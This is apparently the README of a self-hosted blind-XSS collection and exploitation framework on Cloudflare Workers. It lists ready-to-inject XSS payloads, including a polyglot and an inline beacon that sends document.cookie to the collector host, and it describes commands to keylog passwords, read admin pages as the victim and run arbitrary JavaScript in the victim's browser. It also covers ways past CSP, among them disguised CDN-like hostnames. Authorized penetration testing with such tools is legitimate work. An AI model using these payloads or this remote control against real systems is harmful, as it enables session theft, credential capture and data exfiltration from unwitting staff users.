# blind-xss-collector

> A self-hosted, **interactive** blind-XSS detection and exploitation framework on Cloudflare Workers + D1.

`blind-xss-collector` is an out-of-band listener for finding **stored / blind cross-site
scripting** — the kind that fires later, in *someone else's* authenticated browser (a support
agent, a moderator, an admin reviewing your input). When the probe executes it phones home with
a full picture of that session, and — while the victim's tab stays open — lets you **drive their
browser live** from a dashboard.

It does the same job as **XSS Hunter** / **ezXSS**, with one difference that matters for
professional engagements: everything runs on **your own Cloudflare account**. The client DOM,
cookies, storage, and screenshots your probe collects never touch a third-party service.

<table>
<tr><td><b>Runtime</b></td><td>Cloudflare Workers (single file) + D1 (SQLite)</td></tr>
<tr><td><b>Dependencies</b></td><td>None. No build step. Wrangler ships the source directly.</td></tr>
<tr><td><b>Data ownership</b></td><td>100% self-hosted — callback data stays in your D1</td></tr>
<tr><td><b>Cost</b></td><td>Runs comfortably on the Cloudflare free plan</td></tr>
</table>

---

> ## ⚠️ Authorized testing only
> Blind XSS executes in a real person's authenticated session. Use this tool **only** against
> targets you are **authorized in writing** to test (bug-bounty scope, signed pentest, your own
> apps). Keep proofs minimal, never read real user data beyond what proves impact, and **purge**
> all collected data when the engagement closes. This is a **defensive** tool: its purpose is to
> locate the stored-XSS sink so it can be fixed. You are responsible for how you use it.

---

## Table of contents
- [Features](#features)
- [How it works](#how-it-works)
- [Authentication & security model](#authentication--security-model)
- [Installation](#installation)
- [Using the dashboard](#using-the-dashboard)
- [Payloads](#payloads)
- [The interactive console](#the-interactive-console)
- [CSP-aware exfiltration](#csp-aware-exfiltration)
- [Local development & the demo testbed](#local-development--the-demo-testbed)
- [Testing](#testing)
- [Purging data](#purging-data)
- [HTTP API reference](#http-api-reference)
- [Troubleshooting](#troubleshooting)
- [Project structure](#project-structure)

---

## Features

**Automatic capture** — the instant a probe fires it collects:
- 🎯 **fire URL + page title + origin** — identifies exactly which injection point executed, and in whose panel
- 🌐 **victim IP** (server-side), **User-Agent**, and browser/device fingerprint
- 🍪 `document.cookie` (all non-`HttpOnly` cookies), **`localStorage`** and **`sessionStorage`**
- 📄 a full **DOM snapshot** of the victim's authenticated page
- 📝 every **form / hidden input** (pre-filled admin values, CSRF tokens) and `<meta>` tags

**Live interactive control** — while the victim's tab stays open (the probe long-polls every 5s):
- 🔁 re-dump `dom` / `cookies` / `storage` / `forms` on demand
- 🔓 **`fetch:<url>`** — read a same-origin page or API **as the victim**, with their cookies (admin panels, internal APIs, other users' records — an in-browser authenticated read that defeats CSRF)
- ⌨️ **`keylog:<selector>`** — capture the **full** keystroke log, grouped per field
- 📸 **`screenshot`** — best-effort page image (html2canvas)
- 🧪 **`eval:<js>`** — run arbitrary JavaScript in the victim's context

**Operator dashboard** — a single auth-gated page:
- 📡 **live session feed** with a pulse indicator showing which victims are still connected
- 🔎 filter, per-field copy buttons, inline screenshot rendering
- 🧬 a built-in **Payload Generator**: mint a unique token per injection point and get ready-to-inject payloads for every context (including an all-context **polyglot**), each one click to copy
- 🗂️ a **token registry** that maps every token to its surface (your canary map)
- 🗑️ **one-click delete** of any session and its data

**Evasion & resilience**
- 🛡️ **CSP-aware exfiltration**: `fetch` → `sendBeacon` → chunked image-beacon, so data escapes even a strict `connect-src`
- 🔑 constant-time dashboard auth; the public collector endpoints carry no secrets
- 🧩 unique token per injection point so every callback self-identifies

---

## How it works

```
   OPERATOR                         VICTIM (admin/support browser)          COLLECTOR (your Worker + D1)
 ┌────────────┐                   ┌──────────────────────────────┐       ┌───────────────────────────┐
 │ mint token │                   │                              │       │                           │
 │ + payload  │──inject into──────▶  stored field renders later  │       │                           │
 │ (Generator)│   target's input  │  in a staff panel → fires    │       │                           │
 │            │                   │                              │       │                           │
 │            │                   │  GET  /c/<token>  ───────────┼──────▶│  serves the probe         │
 │            │                   │  POST /r/<token>  (capture)  ┼──────▶│  stores report → D1       │
 │  watch &   │◀──dashboard───────│  GET  /q/<sid>    (poll 5s)  ◀┼───────┤  hands out your commands  │
 │  control   │   reads D1        │  POST /qr/<id>    (result)   ─┼──────▶│  writes result → D1       │
 └────────────┘                   └──────────────────────────────┘       └───────────────────────────┘
```

1. You mint a **unique token** per injection point and inject its payload into a stored input.
2. Later a **victim** opens the page that renders it; their browser loads `GET /c/<token>` — the probe.
3. The probe **captures the session** and POSTs a full report; the Worker stores it in **D1**.
4. The probe **long-polls** for commands you queue, runs them in the victim's context, returns results.
5. You watch sessions arrive live in the **dashboard** and drive the interactive console.

---

## Authentication & security model

**Single operator, session-cookie login — no credential in the URL.** Earlier builds gated the
dashboard with `?key=…`, which leaks the secret into browser history, `Referer` headers, and
proxy/CDN logs. That is gone. Instead:

- **`POST /login`** with the password (your `AUTH_KEY`) sets a **signed, HttpOnly, `Secure`,
  `SameSite=Strict`** session cookie — an HMAC-SHA256 token over an expiry (7 days), verified
  statelessly (no session store). JavaScript on the page cannot read it, and it never appears in
  a URL. **`POST /logout`** clears it. The password is verified in constant time.
- The dashboard and every **`/api/*`** route require that cookie. For CLI/automation you may
  instead send the password in an **`X-Auth-Key`** header (kept out of the URL). Nothing is ever
  accepted from the query string.

**Why the collector endpoints are intentionally public.** `/c/:token`, `/r/:token`, `/p/:token`,
`/q/:sid`, and `/qr/:id` are unauthenticated **by necessity** — the probe executes in the
*victim's* browser and cannot carry your operator secret; a blind-XSS callback has to be reachable
without credentials. This is inherent to the technique, not a fixable flaw, and it matches how
XSS Hunter / ezXSS work. The exposure is limited and low-impact:

- The **sensitive data** (captured sessions, DOM, cookies, command results) lives only behind the
  authenticated dashboard/API. The public routes never read it back out.
- Tokens and `sid`s are random and unguessable; someone who does not know a live value cannot
  meaningfully interact. The worst an attacker who *guesses* one could do is submit junk reports
  or poll a random session — noise, not disclosure.

**Hardening recommendations:** use a long random `AUTH_KEY` (`openssl rand -hex 32`) and rotate it
per engagement; serve behind a custom domain over HTTPS; and **purge** collected data at close
(see [Purging data](#purging-data)). The `Secure` cookie requires a secure origin — `https://` or
`http://localhost` / `http://127.0.0.1`; a plain-`http` non-localhost host will not retain it.

---

## Installation

### Prerequisites
- A **Cloudflare account** (free plan is sufficient)
- **Node.js 18+** and **npm**
- **Wrangler** (Cloudflare's CLI) — installed globally or invoked with `npx`
- *Optional:* a domain on Cloudflare (for an innocuous callback hostname)
- *Optional:* Google Chrome (only to run the end-to-end test)

### Deploy to Cloudflare

```sh
git clone https://github.com/MomoRizza/blind-xss-collector.git
cd blind-xss-collector

npm i -g wrangler          # or prefix each command with: npx
wrangler login             # authorize your Cloudflare account

# 1. create the D1 database, then paste the printed database_id into wrangler.toml
wrangler d1 create bxss

# 2. create the tables
wrangler d1 execute bxss --remote --file=schema.sql

# 3. set the operator password (a long random string, e.g. `openssl rand -hex 32`)
#    this is the password you log in with; it is also the X-Auth-Key for CLI access
wrangler secret put AUTH_KEY

# 4. deploy
wrangler deploy
```

Wrangler prints your Worker URL. Verify:

```sh
curl -s https://<host>/c/smoketest | head -c 80                       # probe JS
curl -s https://<host>/ | grep -o 'operator sign in'                  # login page for anon
curl -s -X POST https://<host>/login -d '{"password":"YOUR_PASSWORD"}' -i | grep -i set-cookie
```

Open **`https://<host>/`** and sign in with your `AUTH_KEY`. A signed **HttpOnly** session
cookie is set (no credential ever appears in the URL). See [Authentication & security model](#authentication--security-model).

### Use an innocuous custom domain (recommended)
Cloudflare dashboard → **Workers & Pages → your worker → Settings → Triggers → Custom Domains →
Add**, and point a benign hostname (e.g. `cdn-metrics.example.net`) at it. Callbacks then look
like `https://cdn-metrics.example.net/c/<token>`, and matching the host to a CDN-looking name can
help against `script-src` allowlists.

---

## Using the dashboard

Open `https://<host>/`, sign in, and you land on the dashboard — two tabs, plus a **sign out** button in the header.

### Sessions
- **Live feed** of every session, newest first. A **pulsing green dot** means that victim's tab
  is still connected (polled within 30s) so interactive commands will land; a grey dot means it
  closed — the automatic capture is still there.
- **Filter** by token / URL / IP.
- **Delete** a session with the **×** on its row (removes its reports, commands, and chunks).
- Click a session for the full capture: fire URL, victim IP/UA, cookies, storage, forms, meta —
  each with a copy button — the interactive console, command results, and the DOM snapshot (with
  the screenshot rendered inline).

### Payload Generator
1. Enter an **injection-point label** (e.g. `support-form`).
2. Confirm the **collector host** (pre-filled).
3. **Generate** → you get a **unique token**, its probe URL, and ready-to-inject payloads for
   every context (polyglot, external `<script>`, event-handler, markup-injection, strict-CSP
   beacon) — each with a copy button, host and token already substituted.
4. Every token is saved to the **token registry** (token → label → host) in your browser — your
   canary map. Mirror it into your engagement notes.

---

## Payloads

Point every payload at `https://<HOST>/c/<TOKEN>` with a **distinct token per injection point**.
Full catalogue with per-context notes: [`payloads.md`](payloads.md). Highlights:

**Polyglot — one payload for any input** (paste when you don't know the sink's context):
```html
">'></textarea></title></style></script><svg onload=import('//HOST/c/TOKEN')><img src onerror=import('//HOST/c/TOKEN')><script src=//HOST/c/TOKEN></script>
```

**External script** (if `script-src` allows the host):
```html
"><script src=//HOST/c/TOKEN></script>
```

**Attribute / event-handler** (no `<script>` needed):
```html
" onfocus="import('//HOST/c/TOKEN')" autofocus x="
"><img src=x onerror="import('//HOST/c/TOKEN')">
```

**Strict-CSP degraded beacon** (confirms fire + leaks cookie via `img-src`):
```html
"><script>new Image().src='//HOST/p/TOKEN?f=r&s=inline&i=0&n=1&d='+btoa(location+' '+document.cookie)</script>
```

Classic blind-XSS surfaces to seed: support tickets, contact/abuse forms, CRM profile fields,
order notes, moderation queues, uploaded filenames, logged HTTP headers (`User-Agent`,
`Referer`, `X-Forwarded-For`) rendered in admin log viewers, and SSO/SCIM display-name attributes.

---

## The interactive console

Once a probe has fired and the victim's tab is still open (green dot), open the session and use the
**interactive** card — quick-action buttons or the free-form command box. Commands are queued,
picked up on the probe's next 5s poll, executed in the victim's page, and the result returns to the
*command results* card (expect a few seconds of latency).

| Command | What it does | Example |
|---|---|---|
| `dom` | Re-dump the current full DOM | `dom` |
| `cookies` | Re-dump `document.cookie` | `cookies` |
| `storage` | Re-dump `localStorage` + `sessionStorage` | `storage` |
| `forms` | Re-dump all form / hidden-input values | `forms` |
| `fetch:<url>` | **Read a same-origin URL as the victim** (their cookies ride along) | `fetch:/admin/users` |
| `keylog:<selector>` | Capture keystrokes; blank = whole document | `keylog:#password` |
| `screenshot` | Best-effort page screenshot (html2canvas) | `screenshot` |
| `eval:<js>` | Run arbitrary JS in the victim context | `eval:document.domain` |

**Keylog captures the full log.** The logger buffers **every** keystroke and streams the growing
transcript (not just the last key), grouped by field with named keys in braces:
```
[email] jdoe@corp.com{Tab}
[password] Hunter2!{Enter}
```

**A worked example — turning "it fired" into proven impact:**
```
eval:document.domain        → confirm the admin origin
fetch:/admin/export         → read the customer export (200 because their cookie rode along)
screenshot                  → visual proof of the authenticated panel
keylog:                     → capture credentials typed into a re-auth prompt
```

---

## CSP-aware exfiltration

The probe adapts to the victim page's Content-Security-Policy, trying channels in order:

1. **`fetch()` (CORS)** — POST the report when `connect-src` allows the collector host.
2. **`navigator.sendBeacon`** — a POST that survives page unload.
3. **Chunked `Image()` GET** — when `connect-src` is locked down but `img-src` allows the host, the
   report is base64-split across image requests and **reassembled server-side**.

So data escapes even a hardened page as long as `img-src` reaches your collector. If both
`connect-src` and `img-src` are locked to `self`, use the degraded inline beacon (see `payloads.md`).

---

## Local development & the demo testbed

Run the whole stack locally — no Cloudflare account needed.

```sh
# 1. local D1 + a dev key
wrangler d1 execute bxss --local --file=schema.sql
echo 'AUTH_KEY = "devkey"' > .dev.vars      # gitignored; this is your login password in dev

# 2. the real collector (runs the actual worker.js)
wrangler dev                                 # → http://127.0.0.1:8787  (open it, sign in with: devkey)

# 3. the mock vulnerable app to fire against
npm run demo                                 # → http://127.0.0.1:8080
```

The **demo testbed** (`demo/`) is a mock support desk with a genuine stored-XSS sink: submit a
"ticket" containing a generated payload on the attacker side, open `/admin` to play the admin, and
the probe fires into an authenticated staff page (with a fake cookie, `localStorage`, and CSRF
token). `/admin/secret` is cookie-gated to test `fetch`-as-victim, and `/admin?csp=1` forces the
image-beacon fallback. Full walkthrough: [`demo/README.md`](demo/README.md).

---

## Testing

Execution-verified with **no cloud deploy** (a `node:sqlite` adapter runs the real `worker.js`):

```sh
npm test          # 24 server-side assertions: report store, auth gate, command lifecycle,
                  # chunked image-beacon reassembly
npm run test:e2e  # 13 assertions driving real headless Chrome as the victim against a mock
                  # admin app — full fire → capture → cross-origin exfil → fetch-as-victim →
                  # strict-CSP image-beacon fallback  (requires Google Chrome)
```

---

## Purging data

At engagement close, delete all callback data from D1:

```sh
wrangler d1 execute bxss --remote --command \
  "DELETE FROM reports; DELETE FROM sessions; DELETE FROM commands; DELETE FROM chunks;"
```

Also clear the browser's token registry (Payload Generator tab). Delete a single session anytime
with the **×** on its row in the dashboard.

---

## HTTP API reference

| Route | Method | Auth | Purpose |
|---|---|---|---|
| `/c/:token[.js]` | GET | public | Serve the probe (victims load this) |
| `/r/:token` | POST | public | Full capture report (`fetch`/`sendBeacon`) |
| `/p/:token` | GET | public | Chunked image-beacon report (CSP fallback) |
| `/q/:sid` | GET | public | Probe polls for queued commands |
| `/qr/:id` | POST | public | Probe returns a command result |
| `/login` | POST | public | Exchange the password for a session cookie |
| `/logout` | POST | cookie | Clear the session cookie |
| `/` | GET | cookie | Operator dashboard (login page if unauthenticated) |
| `/api/sessions` | GET | cookie | List sessions |
| `/api/reports?sid=` | GET | cookie | Reports for one session |
| `/api/cmdresults?sid=` | GET | cookie | Commands + results for one session |
| `/api/cmd` | POST | cookie | Queue a command `{sid, cmd}` |
| `/api/delete` | POST | cookie | Delete a session `{sid}` and its data |

The probe (`/c`) and callback routes (`/r`, `/p`, `/q`, `/qr`) are **public by necessity** — the
victim's browser holds no secret. The dashboard and `/api/*` require the session cookie (or the
`X-Auth-Key` header for CLI); no credential is ever accepted from the URL. See
[Authentication & security model](#authentication--security-model).

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `wrangler deploy` fails on D1 | `database_id` in `wrangler.toml` is still the placeholder, or you didn't run `d1 create bxss`. |
| Login says invalid password | The password must match the `AUTH_KEY` secret (`wrangler secret put AUTH_KEY`). |
| Signed in but bounced back to login | The `Secure` session cookie needs a secure origin. `https://` and `http://localhost` / `http://127.0.0.1` work; a plain-`http` non-localhost host will not keep the cookie — deploy behind Cloudflare's HTTPS. |
| Probe serves but no session appears | The page's CSP blocks the exfil channels — check for strict `connect-src` **and** `img-src`; use the inline beacon in `payloads.md`. |
| Session shows but commands never complete | The victim tab closed (grey dot). Live commands need the tab open; the automatic capture is still valid. |
| `no such table` | Schema not loaded — run `d1 execute bxss --remote --file=schema.sql`. |
| External-`<script>` payload doesn't run | `script-src` doesn't allow your host — match a custom domain to an allowed CDN, or use an event-handler / `import()` payload. |

---

## Project structure

```
src/worker.js       Cloudflare Worker — collector endpoints + auth-gated dashboard API
src/probe.js        the injectable probe (token/base substituted at serve time)
src/dashboard.js    the operator UI (Sessions feed + Payload Generator)
schema.sql          D1 tables: sessions, reports, commands, chunks
wrangler.toml       Worker + D1 binding config
payloads.md         delivery payloads per injection context + CSP notes
demo/               local mock-vulnerable testbed for manual testing
test/               unit + end-to-end test suites (and a node:sqlite D1 shim)
```

---

## License & disclaimer

Provided for **authorized security testing and research**. The authors accept no liability for
misuse. Verify you have explicit permission before testing any target you do not own.
